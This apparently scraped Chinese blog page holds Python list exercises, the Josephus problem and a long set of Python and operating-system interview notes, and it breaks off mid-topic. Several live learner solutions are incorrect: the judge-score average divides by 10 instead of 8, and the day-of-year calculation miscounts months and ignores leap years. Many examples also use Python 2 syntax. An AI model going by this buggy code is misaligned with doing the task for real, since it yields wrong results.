9.约瑟夫问题：有ｎ只猴子，按顺时针方向围成一圈选大王（编号从１到ｎ），从第１号开始报数，一直数到ｍ，数到ｍ的猴子退出圈外，剩下的猴子再接着从1开始报数。就这样，直到圈内只剩下一只猴子时，这个猴子就是猴王，现在给你n和m，请你输出最后猴王的编号。 python列表练习题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140# 1、输入任意十个数,打印出它们中的最大数、最小数。list = [int(i) for i in input(&#x27;请输入十个整数：&#x27;).split(&#x27;,&#x27;)]max=min=list[0]for i in range(10): if list[i]&gt;max: max = list[i] elif list[i]&lt;min: min = list[i]print(max,min)# numbers = []# for i in range(10):# n = int(input(&#x27;请输入第&#x27; + str(i + 1) + &#x27;个数:&#x27;))# numbers.append(n)# if i == 0:# max = min = n# else:# if n &gt; max:# max = n# if n &lt; min:# min = n# # 2、有一个列表,内放10个整数。要求找出最小的数和它的下标,然后把它和数# # 组中最前面的元素对换位置。import randomlist = [random.randint(1,100) for i in range(10)]print(list)min = list[0]a = 0for i in range(10): if min &gt; list[i]: min = list[i] a = ilist[0],list[a] =list[a],list[0]print(list)print(min)print(a)# import random## numbers = []# for i in range(10):# numbers.append(random.randint(0, 100))## print(numbers)# min = numbers[0] # 假设列表中的第0个元素就是最小数# index = 0 # 假设最小数的下标为0## for i in range(len(numbers)):# n = numbers[i]# if min &gt; n:# min = n# index = i## numbers[index],numbers[0] = numbers[0],numbers[index]# print(numbers)# # 3.青年歌手参加歌曲大奖赛，有10个评委打分，试编程求选手的平均得分（去# # 掉一个最高分和一个最低分）。import randomlist = [random.randint(1, 10) for i in range(10)]print(list)max = min = list[0]average = 0sum = 0for i in range(10): if list[i] &gt; max: max = list[i] elif list[i] &lt; min: min = list[i] sum += list[i]average = (sum - max - min) / 10print(sum)print(average)#import random## numbers = []# sum = 0# count = 10# for i in range(count):# n = random.randint(80, 100)# numbers.append(n)# sum += n# print(numbers,sum)## max = min = numbers[0]## for n in numbers:# if n &gt; max :# max = n# if n &lt; min :# min = n## print((sum - min - max)/(count-2))# 4.输入某年某月某日，判断这一天是这一年的第几天？year = int(input(&#x27;请输入年份：&#x27;))mounth = int(input(&#x27;请输入月份：&#x27;))day = int(input(&#x27;请输入天：&#x27;))if mounth == 1: print(day)else: for i in range(1,mounth+1,2): day += 31 for i in range(2,mounth,2): day += 30 print(day)# year = int(input(&#x27;请输入年：&#x27;))# month = int(input(&#x27;请输入月：&#x27;))# day = int(input(&#x27;请输入日：&#x27;))## ds = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]## if (year % 4 == 0 and year % 100 != 0) or year % 400 == 0:# ds[1] = 29## sum = 0# for i in range(month-1):# sum += ds[i]## sum += day## print(str(year)+&#x27;年&#x27;+str(month)+&#x27;月&#x27;+str(day)+&#x27;日是这一年的第&#x27;+str(sum)+&#x27;天&#x27;) # 5、已知:faibonacci(费波那契)数列的前几个数# 分别为0，1，1，2，3，5，......。从第3 项开始，# 每一项都等于前两项的和。读入一个整数n，编程求# 出此数列的前n 项。-- 使用for循环实现n = int(input(&#x27;请输入一个整数：&#x27;))a, b = 0, 1list = [a,b]for i in range(n): a, b = b, a + b list.append(b)print(list) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485# # 1.从键盘输入一个字符串，判断是否为回文字符串。如&#x27;abcba&#x27;为回文字符串，即第一个和最后一个相同，第二个和倒数第二个相同，依次类推# a = list(input(&quot;请输入一个字符串：&quot;))# print(a)# b = a[::-1]# if a == b:# print(a,&#x27;是回文字符串&#x27;)# else:# print(a,&#x27;不是回文字符串&#x27;)# # 2.给你一个整数组成的列表L，按照下列条件输出： 若L是升序排列的,则输出&quot;UP&quot;; 若L是降序排列的,则输出&quot;DOWN&quot;; 若L无序，则输出&quot;WRONG&quot;。# 示例：输入：L = [1, 1, 3, 3, 4] 输出：UP## L = [1, 1, 3, 3, 4]# count = 0# count1 = 0# for i in range(len(L) - 1):# if L[i] &lt;= L[i + 1]:# count += 1# # if L[i] &gt;= L[i + 1]:# count1 += 1## if count == len(L) - 1:# print(&quot;UP&quot;)# elif count1 == len(L) - 1:# print(&quot;DOWN&quot;)# else:# print(&quot;WRANG&quot;)# # 3.十一假期,小P出去爬山,爬山的过程中每隔10米他都会记录当前点的海拔高度(以一个浮点数表示), 这些值序列保存在一个由浮点数组成的列表h中。# # 回到家中，小P想研究一下自己经过了几个山峰，请你帮他计算一下，输出结果。# # 例如：h=[0.9,1.2,1.22,1.1,1.6,0.99], 将这些高度顺序连线，会发现有两个山峰，故输出一个2(序列两端不算山峰)# # h = [0.9, 1.2, 1.1, 1, 0.9, 0.8, 0.7, 1.22, 1.6, 0.99,0.75,0.60,1.88,1.99,0.88]# h = [0.9, 1.2, 1.22, 1.1, 1.6, 0.99]# n = 0# for i in range(1, len(h) - 1):# if h[i] &gt; h[i - 1] and h[i] &gt; h[i + 1]:# n += 1# print(&#x27;山峰个数：&#x27;, n)# 4.约瑟夫问题：有ｎ只猴子，按顺时针方向围成一圈选大王（编号从１到ｎ），从第１号开始报数，一直数到ｍ，数到ｍ的猴子退出圈外，剩下的猴子再接着从1开始报数。就这样，直到圈内只剩下一只猴子时，这个猴子就是猴王，现在给你n和m，请你输出最后猴王的编号。n = int(input(&quot;输入猴子数量：&quot;))m = int(input(&quot;输入m：&quot;))residue = na = [i for i in range(1, n + 1)]print(a)while residue &gt; 1: if residue &gt; m: a.pop(m - 1) a = a[m - 1:] + a[:m - 1] print(a) residue -= 1 elif residue == m: a.pop() residue -= 1 print(a) elif residue &lt; m: a = a[m % residue:] + a[:m % residue-1] residue -= 1 print(a) # n = int(input(&#x27;n:&#x27;)) # 6# m = int(input(&#x27;m:&#x27;)) # 2# a = [i for i in range(1,n+1)]# # i = 0# counter = 1# # while 1:# if counter % m == 0:# a.remove(a[i])# counter = 1# else:# i+=1# counter += 1# if i &gt;= len(a):# i = 0# if len(a) == 1:# break# print(a)","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"Python面试题","slug":"Python面试题","date":"2020-07-10T06:40:37.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/07/10/Python面试题/","permalink":"http://example.com/2020/07/10/Python%E9%9D%A2%E8%AF%95%E9%A2%98/","excerpt":"python面试题 1.列表去重","text":"python面试题 1.列表去重 1.列表去重1234567891011121314151617# numbers = [2,4,6,7,4,6,7,8]# empty = []# for n in numbers:# flag = True# for e in empty:# if n==e:# flag = False# if flag:# empty.append(n)# print(empty)numbers = [2,4,6,7,4,6,7,8]empty = []for n in numbers: if n not in empty: empty.append(n)print(empty) Python面试题汇总[TOC] Python语言特性1 Python的函数参数传递看两个例子: 12345a = 1def fun(a): a = 2fun(a)print a # 1 12345a = []def fun(a): a.append(1)fun(a)print a # [1] 所有的变量都可以理解是内存中一个对象的“引用”，或者，也可以看似c中void*的感觉。 通过id来看引用a的内存地址可以比较理解： 12345678a = 1def fun(a): print &quot;func_in&quot;,id(a) # func_in 41322472 a = 2 print &quot;re-point&quot;,id(a), id(2) # re-point 41322448 41322448print &quot;func_out&quot;,id(a), id(1) # func_out 41322472 41322472fun(a)print a # 1 注：具体的值在不同电脑上运行时可能不同。 可以看到，在执行完a = 2之后，a引用中保存的值，即内存地址发生变化，由原来1对象的所在的地址变成了2这个实体对象的内存地址。 而第2个例子a引用保存的内存值就不会发生变化： 1234567a = []def fun(a): print &quot;func_in&quot;,id(a) # func_in 53629256 a.append(1)print &quot;func_out&quot;,id(a) # func_out 53629256fun(a)print a # [1] 这里记住的是类型是属于对象的，而不是变量。而对象有两种,“可更改”（mutable）与“不可更改”（immutable）对象。在python中，strings, tuples, 和numbers是不可更改的对象，而 list, dict, set 等则是可以修改的对象。(这就是这个问题的重点) 当一个引用传递给函数的时候,函数自动复制一份引用,这个函数里的引用和外边的引用没有半毛关系了.所以第一个例子里函数把引用指向了一个不可变对象,当函数返回的时候,外面的引用没半毛感觉.而第二个例子就不一样了,函数内的引用指向的是可变对象,对它的操作就和定位了指针地址一样,在内存里进行修改. 如果还不明白的话,这里有更好的解释: http://stackoverflow.com/questions/986006/how-do-i-pass-a-variable-by-reference 2 Python中的元类(metaclass)这个非常的不常用,但是像ORM这种复杂的结构还是会需要的,详情请看:http://stackoverflow.com/questions/100003/what-is-a-metaclass-in-python 3 @staticmethod和@classmethodPython其实有3个方法,即静态方法(staticmethod),类方法(classmethod)和实例方法,如下: 1234567891011121314151617def foo(x): print &quot;executing foo(%s)&quot;%(x)class A(object): def foo(self,x): print &quot;executing foo(%s,%s)&quot;%(self,x) @classmethod def class_foo(cls,x): print &quot;executing class_foo(%s,%s)&quot;%(cls,x) @staticmethod def static_foo(x): print &quot;executing static_foo(%s)&quot;%xa=A() 这里先理解下函数参数里面的self和cls.这个self和cls是对类或者实例的绑定,对于一般的函数来说我们可以这么调用foo(x),这个函数就是最常用的,它的工作跟任何东西(类,实例)无关.对于实例方法,我们知道在类里每次定义方法的时候都需要绑定这个实例,就是foo(self, x),为什么要这么做呢?因为实例方法的调用离不开实例,我们需要把实例自己传给函数,调用的时候是这样的a.foo(x)(其实是foo(a, x)).类方法一样,只不过它传递的是类而不是实例,A.class_foo(x).注意这里的self和cls可以替换别的参数,但是python的约定是这俩,还是不要改的好. 对于静态方法其实和普通的方法一样,不需要对谁进行绑定,唯一的区别是调用的时候需要使用a.static_foo(x)或者A.static_foo(x)来调用. \\ 实例方法 类方法 静态方法 a &#x3D; A() a.foo(x) a.class_foo(x) a.static_foo(x) A 不可用 A.class_foo(x) A.static_foo(x) 更多关于这个问题: http://stackoverflow.com/questions/136097/what-is-the-difference-between-staticmethod-and-classmethod-in-python https://realpython.com/blog/python/instance-class-and-static-methods-demystified/ 4 类变量和实例变量类变量： 是可在类的所有实例之间共享的值（也就是说，它们不是单独分配给每个实例的）。例如下例中，num_of_instance 就是类变量，用于跟踪存在着多少个Test 的实例。 实例变量： 实例化之后，每个实例单独拥有的变量。 12345678910111213class Test(object): num_of_instance = 0 def __init__(self, name): self.name = name Test.num_of_instance += 1 if __name__ == &#x27;__main__&#x27;: print Test.num_of_instance # 0 t1 = Test(&#x27;jack&#x27;) print Test.num_of_instance # 1 t2 = Test(&#x27;lucy&#x27;) print t1.name , t1.num_of_instance # jack 2 print t2.name , t2.num_of_instance # lucy 2 补充的例子 123456789class Person: name=&quot;aaa&quot;p1=Person()p2=Person()p1.name=&quot;bbb&quot;print p1.name # bbbprint p2.name # aaaprint Person.name # aaa 这里p1.name=&quot;bbb&quot;是实例调用了类变量,这其实和上面第一个问题一样,就是函数传参的问题,p1.name一开始是指向的类变量name=&quot;aaa&quot;,但是在实例的作用域里把类变量的引用改变了,就变成了一个实例变量,self.name不再引用Person的类变量name了. 可以看看下面的例子: 123456789class Person: name=[]p1=Person()p2=Person()p1.name.append(1)print p1.name # [1]print p2.name # [1]print Person.name # [1] 参考:http://stackoverflow.com/questions/6470428/catch-multiple-exceptions-in-one-line-except-block 5 Python自省这个也是python彪悍的特性. 自省就是面向对象的语言所写的程序在运行时,所能知道对象的类型.简单一句就是运行时能够获得对象的类型.比如type(),dir(),getattr(),hasattr(),isinstance(). 12345a = [1,2,3]b = &#123;&#x27;a&#x27;:1,&#x27;b&#x27;:2,&#x27;c&#x27;:3&#125;c = Trueprint type(a),type(b),type(c) # &lt;type &#x27;list&#x27;&gt; &lt;type &#x27;dict&#x27;&gt; &lt;type &#x27;bool&#x27;&gt;print isinstance(a,list) # True 6 字典推导式可能你见过列表推导时,却没有见过字典推导式,在2.7中才加入的: 1d = &#123;key: value for (key, value) in iterable&#125; 7 Python中单下划线和双下划线1234567891011121314&gt;&gt;&gt; class MyClass():... def __init__(self):... self.__superprivate = &quot;Hello&quot;... self._semiprivate = &quot;, world!&quot;...&gt;&gt;&gt; mc = MyClass()&gt;&gt;&gt; print mc.__superprivateTraceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: myClass instance has no attribute &#x27;__superprivate&#x27;&gt;&gt;&gt; print mc._semiprivate, world!&gt;&gt;&gt; print mc.__dict__&#123;&#x27;_MyClass__superprivate&#x27;: &#x27;Hello&#x27;, &#x27;_semiprivate&#x27;: &#x27;, world!&#x27;&#125; __foo__:一种约定,Python内部的名字,用来区别其他用户自定义的命名,以防冲突，就是例如__init__(),__del__(),__call__()这些特殊方法 _foo:一种约定,用来指定变量私有.程序员用来指定私有变量的一种方式.不能用from module import * 导入，其他方面和公有一样访问； __foo:这个有真正的意义:解析器用_classname__foo来代替这个名字,以区别和其他类相同的命名,它无法直接像公有成员一样随便访问,通过对象名._类名__xxx这样的方式可以访问. 详情见:http://stackoverflow.com/questions/1301346/the-meaning-of-a-single-and-a-double-underscore-before-an-object-name-in-python 或者: http://www.zhihu.com/question/19754941 8 字符串格式化:%和.format.format在许多方面看起来更便利.对于%最烦人的是它无法同时传递一个变量和元组.你可能会想下面的代码不会有什么问题: 1&quot;hi there %s&quot; % name 但是,如果name恰好是(1,2,3),它将会抛出一个TypeError异常.为了保证它总是正确的,你必须这样做: 1&quot;hi there %s&quot; % (name,) # 提供一个单元素的数组而不是一个参数 但是有点丑..format就没有这些问题.你给的第二个问题也是这样,.format好看多了. 你为什么不用它? 不知道它(在读这个之前) 为了和Python2.5兼容(譬如logging库建议使用%(issue #4)) http://stackoverflow.com/questions/5082452/python-string-formatting-vs-format 9 迭代器和生成器这个是stackoverflow里python排名第一的问题,值得一看: http://stackoverflow.com/questions/231767/what-does-the-yield-keyword-do-in-python 这是中文版: http://taizilongxu.gitbooks.io/stackoverflow-about-python/content/1/README.html 这里有个关于生成器的创建问题面试官有考：问： 将列表生成式中[]改成() 之后数据结构是否改变？答案：是，从列表变为生成器 123456&gt;&gt;&gt; L = [x*x for x in range(10)]&gt;&gt;&gt; L[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]&gt;&gt;&gt; g = (x*x for x in range(10))&gt;&gt;&gt; g&lt;generator object &lt;genexpr&gt; at 0x0000028F8B774200&gt; 通过列表生成式，可以直接创建一个列表。但是，受到内存限制，列表容量肯定是有限的。而且，创建一个包含百万元素的列表，不仅是占用很大的内存空间，如：我们只需要访问前面的几个元素，后面大部分元素所占的空间都是浪费的。因此，没有必要创建完整的列表（节省大量内存空间）。在Python中，我们可以采用生成器：边循环，边计算的机制—&gt;generator 10 *args and **kwargs用*args和**kwargs只是为了方便并没有强制使用它们. 当你不确定你的函数里将要传递多少参数时你可以用*args.例如,它可以传递任意数量的参数: 12345678&gt;&gt;&gt; def print_everything(*args): for count, thing in enumerate(args):... print &#x27;&#123;0&#125;. &#123;1&#125;&#x27;.format(count, thing)...&gt;&gt;&gt; print_everything(&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;cabbage&#x27;)0. apple1. banana2. cabbage 相似的,**kwargs允许你使用没有事先定义的参数名: 1234567&gt;&gt;&gt; def table_things(**kwargs):... for name, value in kwargs.items():... print &#x27;&#123;0&#125; = &#123;1&#125;&#x27;.format(name, value)...&gt;&gt;&gt; table_things(apple = &#x27;fruit&#x27;, cabbage = &#x27;vegetable&#x27;)cabbage = vegetableapple = fruit 你也可以混着用.命名参数首先获得参数值然后所有的其他参数都传递给*args和**kwargs.命名参数在列表的最前端.例如: 1def table_things(titlestring, **kwargs) *args和**kwargs可以同时在函数的定义中,但是*args必须在**kwargs前面. 当调用函数时你也可以用*和**语法.例如: 1234567&gt;&gt;&gt; def print_three_things(a, b, c):... print &#x27;a = &#123;0&#125;, b = &#123;1&#125;, c = &#123;2&#125;&#x27;.format(a,b,c)...&gt;&gt;&gt; mylist = [&#x27;aardvark&#x27;, &#x27;baboon&#x27;, &#x27;cat&#x27;]&gt;&gt;&gt; print_three_things(*mylist)a = aardvark, b = baboon, c = cat 就像你看到的一样,它可以传递列表(或者元组)的每一项并把它们解包.注意必须与它们在函数里的参数相吻合.当然,你也可以在函数定义或者函数调用时用*. http://stackoverflow.com/questions/3394835/args-and-kwargs 11 面向切面编程AOP和装饰器这个AOP一听起来有点懵,同学面阿里的时候就被问懵了… 装饰器是一个很著名的设计模式，经常被用于有切面需求的场景，较为经典的有插入日志、性能测试、事务处理等。装饰器是解决这类问题的绝佳设计，有了装饰器，我们就可以抽离出大量函数中与函数功能本身无关的雷同代码并继续重用。概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。 这个问题比较大,推荐: http://stackoverflow.com/questions/739654/how-can-i-make-a-chain-of-function-decorators-in-python 中文: http://taizilongxu.gitbooks.io/stackoverflow-about-python/content/3/README.html 12 鸭子类型“当看到一只鸟走起来像鸭子、游泳起来像鸭子、叫起来也像鸭子，那么这只鸟就可以被称为鸭子。” 我们并不关心对象是什么类型，到底是不是鸭子，只关心行为。 比如在python中，有很多file-like的东西，比如StringIO,GzipFile,socket。它们有很多相同的方法，我们把它们当作文件使用。 又比如list.extend()方法中,我们并不关心它的参数是不是list,只要它是可迭代的,所以它的参数可以是list&#x2F;tuple&#x2F;dict&#x2F;字符串&#x2F;生成器等. 鸭子类型在动态语言中经常使用，非常灵活，使得python不想java那样专门去弄一大堆的设计模式。 13 Python中重载引自知乎:http://www.zhihu.com/question/20053359 函数重载主要是为了解决两个问题。 可变参数类型。 可变参数个数。 另外，一个基本的设计原则是，仅仅当两个函数除了参数类型和参数个数不同以外，其功能是完全相同的，此时才使用函数重载，如果两个函数的功能其实不同，那么不应当使用重载，而应当使用一个名字不同的函数。 好吧，那么对于情况 1 ，函数功能相同，但是参数类型不同，python 如何处理？答案是根本不需要处理，因为 python 可以接受任何类型的参数，如果函数的功能相同，那么不同的参数类型在 python 中很可能是相同的代码，没有必要做成两个不同函数。 那么对于情况 2 ，函数功能相同，但参数个数不同，python 如何处理？大家知道，答案就是缺省参数。对那些缺少的参数设定为缺省参数即可解决问题。因为你假设函数功能相同，那么那些缺少的参数终归是需要用的。 好了，鉴于情况 1 跟 情况 2 都有了解决方案，python 自然就不需要函数重载了。 14 新式类和旧式类这个面试官问了,我说了老半天,不知道他问的真正意图是什么. stackoverflow 这篇文章很好的介绍了新式类的特性: http://www.cnblogs.com/btchenguang/archive/2012/09/17/2689146.html 新式类很早在2.2就出现了,所以旧式类完全是兼容的问题,Python3里的类全部都是新式类.这里有一个MRO问题可以了解下(新式类是广度优先,旧式类是深度优先),&lt;Python核心编程&gt;里讲的也很多. 一个旧式类的深度优先的例子 12345678910111213141516class A(): def foo1(self): print &quot;A&quot;class B(A): def foo2(self): passclass C(A): def foo1(self): print &quot;C&quot;class D(B, C): passd = D()d.foo1()# A 按照经典类的查找顺序从左到右深度优先的规则，在访问d.foo1()的时候,D这个类是没有的..那么往上查找,先找到B,里面没有,深度优先,访问A,找到了foo1(),所以这时候调用的是A的foo1()，从而导致C重写的foo1()被绕过 15 __new__和__init__的区别这个__new__确实很少见到,先做了解吧. __new__是一个静态方法,而__init__是一个实例方法. __new__方法会返回一个创建的实例,而__init__什么都不返回. 只有在__new__返回一个cls的实例时后面的__init__才能被调用. 当创建一个新实例时调用__new__,初始化一个实例时用__init__. stackoverflow ps: __metaclass__是创建类时起作用.所以我们可以分别使用__metaclass__,__new__和__init__来分别在类创建,实例创建和实例初始化的时候做一些小手脚. 16 单例模式 单例模式是一种常用的软件设计模式。在它的核心结构中只包含一个被称为单例类的特殊类。通过单例模式可以保证系统中一个类只有一个实例而且该实例易于外界访问，从而方便对实例个数的控制并节约系统资源。如果希望在系统中某个类的对象只能存在一个，单例模式是最好的解决方案。 `__new__()`在`__init__()`之前被调用，用于生成实例对象。利用这个方法和类的属性的特点可以实现设计模式的单例模式。单例模式是指创建唯一对象，单例模式设计的类只能实例 **这个绝对常考啊.绝对要记住1~2个方法,当时面试官是让手写的.** 1 使用__new__方法123456789class Singleton(object): def __new__(cls, *args, **kw): if not hasattr(cls, &#x27;_instance&#x27;): orig = super(Singleton, cls) cls._instance = orig.__new__(cls, *args, **kw) return cls._instanceclass MyClass(Singleton): a = 1 2 共享属性创建实例时把所有实例的__dict__指向同一个字典,这样它们具有相同的属性和方法. 123456789class Borg(object): _state = &#123;&#125; def __new__(cls, *args, **kw): ob = super(Borg, cls).__new__(cls, *args, **kw) ob.__dict__ = cls._state return obclass MyClass2(Borg): a = 1 3 装饰器版本1234567891011def singleton(cls): instances = &#123;&#125; def getinstance(*args, **kw): if cls not in instances: instances[cls] = cls(*args, **kw) return instances[cls] return getinstance@singletonclass MyClass: ... 4 import方法作为python的模块是天然的单例模式 123456789101112# mysingleton.pyclass My_Singleton(object): def foo(self): passmy_singleton = My_Singleton()# to usefrom mysingleton import my_singletonmy_singleton.foo() 单例模式伯乐在线详细解释 17 Python中的作用域Python 中，一个变量的作用域总是由在代码中被赋值的地方所决定的。 当 Python 遇到一个变量的话他会按照这样的顺序进行搜索： 本地作用域（Local）→当前作用域被嵌入的本地作用域（Enclosing locals）→全局&#x2F;模块作用域（Global）→内置作用域（Built-in） 18 GIL线程全局锁线程全局锁(Global Interpreter Lock),即Python为了保证线程安全而采取的独立线程运行的限制,说白了就是一个核只能在同一时间运行一个线程.对于io密集型任务，python的多线程起到作用，但对于cpu密集型任务，python的多线程几乎占不到任何优势，还有可能因为争夺资源而变慢。 见Python 最难的问题 解决办法就是多进程和下面的协程(协程也只是单CPU,但是能减小切换代价提升性能). 19 协程知乎被问到了,呵呵哒,跪了 简单点说协程是进程和线程的升级版,进程和线程都面临着内核态和用户态的切换问题而耗费许多切换时间,而协程就是用户自己控制切换的时机,不再需要陷入系统的内核态. Python里最常见的yield就是协程的思想!可以查看第九个问题. 20 闭包闭包(closure)是函数式编程的重要的语法结构。闭包也是一种组织代码的结构，它同样提高了代码的可重复使用性。 当一个内嵌函数引用其外部作作用域的变量,我们就会得到一个闭包. 总结一下,创建一个闭包必须满足以下几点: 必须有一个内嵌函数 内嵌函数必须引用外部函数中的变量 外部函数的返回值必须是内嵌函数 感觉闭包还是有难度的,几句话是说不明白的,还是查查相关资料. 重点是函数运行后并不会被撤销,就像16题的instance字典一样,当函数运行完后,instance并不被销毁,而是继续留在内存空间里.这个功能类似类里的类变量,只不过迁移到了函数上. 闭包就像个空心球一样,你知道外面和里面,但你不知道中间是什么样. 21 lambda函数其实就是一个匿名函数,为什么叫lambda?因为和后面的函数式编程有关. 推荐: 知乎 22 Python函数式编程这个需要适当的了解一下吧,毕竟函数式编程在Python中也做了引用. 推荐: 酷壳 python中函数式编程支持: filter 函数的功能相当于过滤器。调用一个布尔函数bool_func来迭代遍历每个seq中的元素；返回一个使bool_seq返回值为true的元素的序列。 1234&gt;&gt;&gt;a = [1,2,3,4,5,6,7]&gt;&gt;&gt;b = filter(lambda x: x &gt; 5, a)&gt;&gt;&gt;print b&gt;&gt;&gt;[6,7] map函数是对一个序列的每个项依次执行函数，下面是对一个序列每个项都乘以2： 123&gt;&gt;&gt; a = map(lambda x:x*2,[1,2,3])&gt;&gt;&gt; list(a)[2, 4, 6] reduce函数是对一个序列的每个项迭代调用函数，下面是求3的阶乘： 12&gt;&gt;&gt; reduce(lambda x,y:x*y,range(1,4))6 23 Python里的拷贝引用和copy(),deepcopy()的区别 1234567891011121314151617181920import copya = [1, 2, 3, 4, [&#x27;a&#x27;, &#x27;b&#x27;]] #原始对象b = a #赋值，传对象的引用c = copy.copy(a) #对象拷贝，浅拷贝d = copy.deepcopy(a) #对象拷贝，深拷贝a.append(5) #修改对象aa[4].append(&#x27;c&#x27;) #修改对象a中的[&#x27;a&#x27;, &#x27;b&#x27;]数组对象print &#x27;a = &#x27;, aprint &#x27;b = &#x27;, bprint &#x27;c = &#x27;, cprint &#x27;d = &#x27;, d输出结果：a = [1, 2, 3, 4, [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;], 5]b = [1, 2, 3, 4, [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;], 5]c = [1, 2, 3, 4, [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]]d = [1, 2, 3, 4, [&#x27;a&#x27;, &#x27;b&#x27;]] 24 Python垃圾回收机制Python GC主要使用引用计数（reference counting）来跟踪和回收垃圾。在引用计数的基础上，通过“标记-清除”（mark and sweep）解决容器对象可能产生的循环引用问题，通过“分代回收”（generation collection）以空间换时间的方法提高垃圾回收效率。 1 引用计数PyObject是每个对象必有的内容，其中ob_refcnt就是做为引用计数。当一个对象有新的引用时，它的ob_refcnt就会增加，当引用它的对象被删除，它的ob_refcnt就会减少.引用计数为0时，该对象生命就结束了。 优点: 简单 实时性 缺点: 维护引用计数消耗资源 循环引用 2 标记-清除机制基本思路是先按需分配，等到没有空闲内存的时候从寄存器和程序栈上的引用出发，遍历以对象为节点、以引用为边构成的图，把所有可以访问到的对象打上标记，然后清扫一遍内存空间，把所有没标记的对象释放。 3 分代技术分代回收的整体思想是：将系统中的所有内存块根据其存活时间划分为不同的集合，每个集合就成为一个“代”，垃圾收集频率随着“代”的存活时间的增大而减小，存活时间通常利用经过几次垃圾回收来度量。 Python默认定义了三代对象集合，索引数越大，对象存活时间越长。 举例：当某些内存块M经过了3次垃圾收集的清洗之后还存活时，我们就将内存块M划到一个集合A中去，而新分配的内存都划分到集合B中去。当垃圾收集开始工作时，大多数情况都只对集合B进行垃圾回收，而对集合A进行垃圾回收要隔相当长一段时间后才进行，这就使得垃圾收集机制需要处理的内存少了，效率自然就提高了。在这个过程中，集合B中的某些内存块由于存活时间长而会被转移到集合A中，当然，集合A中实际上也存在一些垃圾，这些垃圾的回收会因为这种分代的机制而被延迟。 25 Python的List推荐: http://www.jianshu.com/p/J4U6rR 26 Python的isis是对比地址,&#x3D;&#x3D;是对比值 27 read,readline和readlines read 读取整个文件 readline 读取下一行,使用生成器方法 readlines 读取整个文件到一个迭代器以供我们遍历 28 Python2和3的区别推荐：Python 2.7.x 与 Python 3.x 的主要差异 29 super initsuper() lets you avoid referring to the base class explicitly, which can be nice. But the main advantage comes with multiple inheritance, where all sorts of fun stuff can happen. See the standard docs on super if you haven’t already. Note that the syntax changed in Python 3.0: you can just say super().__init__() instead of super(ChildB, self).__init__() which IMO is quite a bit nicer. http://stackoverflow.com/questions/576169/understanding-python-super-with-init-methods Python2.7中的super方法浅见 30 range and xrange都在循环时使用，xrange内存性能更好。for i in range(0, 20):for i in xrange(0, 20):What is the difference between range and xrange functions in Python 2.X? range creates a list, so if you do range(1, 10000000) it creates a list in memory with 9999999 elements. xrange is a sequence object that evaluates lazily. http://stackoverflow.com/questions/94935/what-is-the-difference-between-range-and-xrange-functions-in-python-2-x 操作系统1 select,poll和epoll其实所有的I&#x2F;O都是轮询的方法,只不过实现的层面不同罢了. 这个问题可能有点深入了,但相信能回答出这个问题是对I&#x2F;O多路复用有很好的了解了.其中tornado使用的就是epoll的. selec,poll和epoll区别总结 基本上select有3个缺点: 连接数受限 查找配对速度慢 数据由内核拷贝到用户态 poll改善了第一个缺点 epoll改了三个缺点. 关于epoll的: http://www.cnblogs.com/my_life/articles/3968782.html 2 调度算法 先来先服务(FCFS, First Come First Serve) 短作业优先(SJF, Shortest Job First) 最高优先权调度(Priority Scheduling) 时间片轮转(RR, Round Robin) 多级反馈队列调度(multilevel feedback queue scheduling) 常见的调度算法总结:http://www.jianshu.com/p/6edf8174c1eb 实时调度算法: 最早截至时间优先 EDF 最低松弛度优先 LLF 3 死锁原因: 竞争资源 程序推进顺序不当 必要条件: 互斥条件 请求和保持条件 不剥夺条件 环路等待条件 处理死锁基本方法: 预防死锁(摒弃除1以外的条件) 避免死锁(银行家算法) 检测死锁(资源分配图) 解除死锁 剥夺资源 撤销进程 死锁概念处理策略详细介绍:https://wizardforcel.gitbooks.io/wangdaokaoyan-os/content/10.html 4 程序编译与链接推荐: http://www.ruanyifeng.com/blog/2014/11/compiler.html Bulid过程可以分解为4个步骤:预处理(Prepressing), 编译(Compilation)、汇编(Assembly)、链接(Linking) 以c语言为例: 1 预处理预编译过程主要处理那些源文件中的以“#”开始的预编译指令，主要处理规则有： 将所有的“#define”删除，并展开所用的宏定义 处理所有条件预编译指令，比如“#if”、“#ifdef”、 “#elif”、“#endif” 处理“#include”预编译指令，将被包含的文件插入到该编译指令的位置，注：此过程是递归进行的 删除所有注释 添加行号和文件名标识，以便于编译时编译器产生调试用的行号信息以及用于编译时产生编译错误或警告时可显示行号 保留所有的#pragma编译器指令。 2 编译编译过程就是把预处理完的文件进行一系列的词法分析、语法分析、语义分析及优化后生成相应的汇编代码文件。这个过程是整个程序构建的核心部分。 3 汇编汇编器是将汇编代码转化成机器可以执行的指令，每一条汇编语句几乎都是一条机器指令。经过编译、链接、汇编输出的文件成为目标文件(Object File) 4 链接链接的主要内容就是把各个模块之间相互引用的部分处理好，使各个模块可以正确的拼接。链接的主要过程包块 地址和空间的分配（Address and Storage Allocation）、符号决议(Symbol Resolution)和重定位(Relocation)等步骤。 5 静态链接和动态链接静态链接方法：静态链接的时候，载入代码就会把程序会用到的动态代码或动态代码的地址确定下来静态库的链接可以使用静态链接，动态链接库也可以使用这种方法链接导入库 动态链接方法：使用这种方式的程序并不在一开始就完成动态链接，而是直到真正调用动态库代码时，载入程序才计算(被调用的那部分)动态代码的逻辑地址，然后等到某个时候，程序又需要调用另外某块动态代码时，载入程序又去计算这部分代码的逻辑地址，所以，这种方式使程序初始化时间较短，但运行期间的性能比不上静态链接的程序 6 虚拟内存技术虚拟存储器是指具有请求调入功能和置换功能,能从逻辑上对内存容量加以扩充的一种存储系统. 7 分页和分段分页: 